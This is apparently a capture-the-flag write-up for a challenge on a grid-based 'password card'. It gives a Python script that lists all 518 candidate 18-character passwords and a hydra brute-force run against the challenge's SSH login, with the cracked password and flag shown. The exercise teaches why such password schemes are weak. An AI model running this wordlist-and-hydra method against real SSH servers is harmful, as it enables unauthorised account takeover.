# Long secure password (3 points)

Hi, TCC-CSIRT analyst,

a new colleague came up with a progressive way of creating a memorable password
and would like to implement it as a new standard at TCC. Each user receives a
`TCC-CSIRT password card` and determines the password by choosing the starting
coordinate, direction, and number of characters. For skeptics about the
security of such a solution, he published the card with a challenge to log in
to his SSH server.

Verify if the card method has any weaknesses by logging into the given server.

* [Download the password card](long_secure_password.zip)
  (sha256 checksum: `9a35dc6284c8bde03118321b86476cf835a3b48a5fcf09ad6d64af22b9e555ca`)
* The server has domain name `password-card-rules.cypherfix.tcc` and the
  colleagues's username is futurethinker.

See you in the next incident!

## Hints

* The entropy is at first glance significantly lower than that of a randomly
  generated password.
* We know that the colleague's favorite number is `18`, so it can be assumed
  that the password has this length as well.

## Solution

After extracting a password card from the archive we can see that the arrows
indicate 8 possible directions. With this information we can write a piece of
code to extract all possible 18-character passwords from the card.

```python
CARD = [
    "SQUIRELL*JUDGE*NEWS*LESSON",
    "WORRY*UPDATE*SEAFOOD*CROSS",
    "CHAPTER*SPEEDBUMP*CHECKERS",
    "PHONE*HOPE*NOTEBOOK*ORANGE",
    "CARTOONS*CLEAN*TODAY*ENTER",
    "ZEBRA*PATH*VALUABLE*MARINE",
    "VOLUME*REDUCE*LETTUCE*GOAL",
    "BUFFALOS*THE*CATCH*SUPREME",
    "LONG*OCTOPUS*SEASON*SCHEME",
    "CARAVAN*TOBACCO*WORM*XENON",
    "PYPPYLIKE*WHATEVER*POPULAR",
    "SALAD*UNKNOWN*SQUATS*AUDIT",
    "HOUR*NEWBORN*TURN*WORKSHOP",
    "USEFUL*OFFSHORE*TOAST*BOOK",
    "COMPANY*FREQUENCY*NINETEEN",
    "AMOUNT*CREATE*HOUSE*FOREST",
    "BATTERY*GOLDEN*ROOT*WHEELS",
    "SHEEP*HOLIDAY*APPLE*LAWYER",
    "SUMMER*HORSE*WATER*SULPHUR",
]
PASS_LEN = 18
CARD_HEIGHT = len(CARD)
CARD_WIDTH = len(CARD[0])
passwords = set()


def add_pass(row, col, dRow, dCol):
    endRow = row + (PASS_LEN - 1) * dRow
    endCol = col + (PASS_LEN - 1) * dCol
    if endRow < 0 or endRow >= CARD_HEIGHT or endCol < 0 or endCol >= CARD_WIDTH:
        return
    pwd = ""
    for _ in range(PASS_LEN):
        pwd += CARD[row][col]
        row += dRow
        col += dCol
    passwords.add(pwd)


for row in range(CARD_HEIGHT):
    for col in range(CARD_WIDTH):
        add_pass(row, col, -1,  0)  # up
        add_pass(row, col, -1,  1)  # up-right
        add_pass(row, col,  0,  1)  # right
        add_pass(row, col,  1,  1)  # down-right
        add_pass(row, col,  1,  0)  # down
        add_pass(row, col,  1, -1)  # down-left
        add_pass(row, col,  0, -1)  # left
        add_pass(row, col, -1, -1)  # up-left

for p in passwords:
    print(p)
```

If we run this code and save the result in `passwords.txt` we end up with
518 potential password candidates.

In order to test which is the correct one, we can use e.g. hydra

```console
$ hydra -l futurethinker -P passwords.txt -t 4 ssh://password-card-rules.cypherfix.tcc
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-07 17:22:45
[DATA] max 4 tasks per 1 server, overall 4 tasks, 518 login tries (l:1/p:518), ~130 tries per task
[DATA] attacking ssh://password-card-rules.cypherfix.tcc:22/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 438 to do in 00:06h, 4 active
[22][ssh] host: password-card-rules.cypherfix.tcc   login: futurethinker   password: SAOPUNUKTPHCANEMFW
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-07 17:24:35
```

Now that we know the password, we can log in to SSH server to retrieve the flag.

```console
$ ssh futurethinker@password-card-rules.cypherfix.tcc
futurethinker@password-card-rules.cypherfix.tcc's password:
Nobody will ever read this message anyway, because the TCC password card is super secure. Even my lunch access-code is safe here: FLAG{uNZm-GGVK-JbxV-1DIx}
Connection to password-card-rules.cypherfix.tcc closed.
```
